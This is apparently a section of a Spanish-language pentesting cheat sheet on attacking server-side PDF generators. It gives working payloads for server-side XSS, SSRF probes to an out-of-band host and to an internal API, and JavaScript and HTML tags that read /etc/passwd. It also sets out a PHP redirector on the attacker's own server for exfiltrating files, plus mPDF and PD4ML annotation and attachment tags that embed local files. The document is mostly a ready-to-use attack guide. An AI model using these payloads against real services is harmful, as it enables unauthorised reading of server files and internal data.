### JS

Si la creación del PDF no está correcamente sanitizada, encontraremos que en momento de la ejecución el payload se ejecutará. Esto también es conocimo como server-side XSS.

Podemos testearlo ingresando payloads como:

    <script>document.write('test1')</script>

o

    <script>document.write(window.location)</script>

### SSRF

#### TEST

Es una de las vulnerabilidades más comunes en la generación de PDFs en la web. Esto es debido a que muchas de las fuentes de estilos o imagenes necesarias para generar el PDF se encuentran en internet, por lo que 
el generador necesitará hacerles un fetch.

Podemos entonces forzar al server a hacer una request GET a una URL que nosotros nos interese.

Para probarlo solamente necesitaríamos crear una imageno un stylesheet que apunte a una URL o servidor bajo nuestro poder:

Imagen:

    <img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>

Stylesheet:

    <link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >


Por supuesto, muchas de estas request van a ser de tipo BLIND, ya que no tendrán realmente qué mostrar. Para materializarlas en el PDF podríamos usar un iframe que dispare una request.

    <iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>

#### SSRF exploitation

Si todo va bien,  podríamos entonces aprovechar la SSRF para llegar a servicios internos o abusar de las relaciones de confianza para alcanzar secciones prohibidas dentro de la web debido a la falta de privilegios. 
O, incluso, exfiltrar datos de una API:

    <iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>


### LFI

Podemos aprovechar el  objeto XmlHttpRequests para exfiltrar contenido de archivos del sistema y volverlos a base64(esto es debido a que el contenido de algunos archivos puede romper al generador). A su vez, los generadores de PDF no suelen pensar en líneas
con lo cual, no llegaremos a leer el base64 completo por su tamaño, de esta manera deberemos agregar una funcionalidad a nuestro payload para generar estos saltos de línea:

    <script>
    	function addNewlines(str) {
    		var result = '';
    		while (str.length > 0) {
    		    result += str.substring(0, 100) + '\n';
    			str = str.substring(100);
    		}
    		return result;
    	}
    
    	x = new XMLHttpRequest();
    	x.onload = function(){
    		document.write(addNewlines(btoa(this.responseText)))
    	};
    	x.open("GET", "file:///etc/passwd");
    	x.send();
    </script>

Si el backend no ejecuta el JS, podemos probar otros payloads con etiquetas HTML:

    <iframe src="file:///etc/passwd" width="800" height="500"></iframe>
    <object data="file:///etc/passwd" width="800" height="500">
    <portal src="file:///etc/passwd" width="800" height="500">


#### Exfiltración mediante un PHP redirector

Puede ser que en los casos anteriores de LFI el servidor no mmuestre los resultados mostrándonos solamente un IFRAME vacío. Podríamos combinar el SSRF y el LFI para confundir al server y que este nos devuelva el archivo que buscamos aprovechando o abusando las redirecciones creadas desde un server propio:

1) Creamos un archivo php con el siguiente código:

        <?php header('Location: file://' . $_GET['url']); ?>
2) Levantamos un servidor php en la ubicación del archivo
3) Inyectamos el siguiente payload en el PDF generator:
   
        <iframe src="http://<nuestra-ip>/archivo.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>

#### Annotations

Muchos archivos PDF soportan características avanzadas como **annotations** y **attachments**

Deberemos ver, una vez que sabemos la librería que se está usando si esta soporta alguna de estas dos características y cómo las usa. 

A modo de ejemplo: mPDF soporta annotations mediante la tag con su mismo nombre. 

        <annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />

PD4ML usa attachments con la siguiente sintaxis:

        <pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
